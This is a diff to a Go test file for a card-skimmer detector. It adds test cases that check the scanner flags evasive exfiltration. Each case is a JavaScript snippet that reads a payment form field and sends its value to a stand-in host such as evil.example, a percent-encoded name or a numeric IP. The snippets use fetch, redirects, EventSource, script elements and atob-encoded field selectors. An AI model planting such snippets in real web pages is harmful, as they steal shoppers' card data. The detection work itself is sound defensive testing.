@@ -323,6 +323,19 @@ func TestSkimmerSignalsOnTokens(t *testing.T) {
 		"backslashes in a URL":     fields + `fetch('https:\\\\img.example.com/p?d='+f.value)`,
 		"full-width host":          fields + "fetch('https://\uff49\uff4d\uff47.example.com/p?d='+f.value)",
 		"thousands of brackets":    fields + "new" + strings.Repeat("(", 2100) + "Image" + strings.Repeat(")", 2100) + `().src="https://img.example.com/p?d="+f.value`,
+		"percent-encoded host":     fields + `fetch('https://%65vil%2Eexample/p?d='+f.value)`,
+		"IPv4 as one number":       fields + `fetch('https://3232235777/p?d='+f.value)`,
+		"IPv4 in hexadecimal":      fields + `fetch('http://0x7f.1/p?d='+f.value)`,
+		"IPv6":                     fields + `fetch('https://[2001:db8::1]/p?d='+f.value)`,
+		"template with a value":    fields + "fetch(`https://evil.example/p?d=${f.value}`)",
+		"URL in a constant":        fields + `var u='https://evil.example/p?d=';fetch(u+f.value)`,
+		"URL with a base":          fields + `fetch(new URL('/p?d='+f.value,'https://evil.example'))`,
+		"location":                 fields + `location.href='https://evil.example/p?d='+f.value`,
+		"window.open":              fields + `window.open('https://evil.example/p?d='+f.value)`,
+		"event source":             fields + `new EventSource('https://evil.example/p?d='+f.value)`,
+		"script element":           fields + `var s=document.createElement('script');s.src='https://evil.example/p?d='+f.value`,
+		"brackets around the URL":  fields + `fetch((('https://evil.example/p?d='+f.value)))`,
+		"comma operator":           fields + `fetch((0,'https://evil.example/p?d=')+f.value)`,
 		"built decoder name":       `var f=document.querySelector('[name="'+globalThis['at'+'ob']('cGF5bWVudFtjY19udW1iZXJd')+'"]');new Image().src="https://img.example.com/p?d="+f.value`,
 		"folded letter":            `var n='ſecurity_code'.toUpperCase().toLowerCase();new Image().src="https://img.example.com/p?d="+n`,
 		"escaped atob":             `var n=\u0061tob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd");var f=document.querySelector(n);`,
@@ -353,7 +366,7 @@ func TestAnchoredSearchesMatchThePatterns(t *testing.T) {
 		"'ſecurity_code'",
 	} {
 		lower := lowerFold([]byte(text))
-		got := matchNear(paymentFieldsLower, lower, paymentAnchors) || matchNear(exfiltrationLower, lower, exitAnchors) || hidden([]byte(text))
+		got := matchNear(paymentFieldsLower, lower, paymentAnchors, nil) || matchNear(exfiltrationLower, lower, exitAnchors, nil) || hidden([]byte(text))
 		if !got {
 			t.Errorf("%.60q...: missed", text)
 		}
@@ -368,10 +381,10 @@ func TestAnchoredSearchesMatchThePatterns(t *testing.T) {
 		// The regions against the full patterns on the same folded text; the folding has cases of
 		// its own above.
 		for name, c := range map[string][2]bool{
-			"fields":  {matchNear(paymentFieldsLower, lower, paymentAnchors), paymentFields.Match(lower)},
-			"harvest": {matchNear(formHarvestLower, lower, harvestAnchors), formHarvest.Match(lower)},
-			"exits":   {matchNear(exfiltrationLower, lower, exitAnchors), exfiltration.Match(lower)},
-			"sends":   {matchNear(sendsLower, lower, sendAnchors), sends.Match(lower)},
+			"fields":  {matchNear(paymentFieldsLower, lower, paymentAnchors, nil), paymentFields.Match(lower)},
+			"harvest": {matchNear(formHarvestLower, lower, harvestAnchors, nil), formHarvest.Match(lower)},
+			"exits":   {matchNear(exfiltrationLower, lower, exitAnchors, nil), exfiltration.Match(lower)},
+			"sends":   {matchNear(sendsLower, lower, sendAnchors, nil), sends.Match(lower)},
 			"hidden":  {hidden(text), obfuscation.Match(lower) || reversed.Match(text)},
 		} {
 			if c[0] != c[1] {
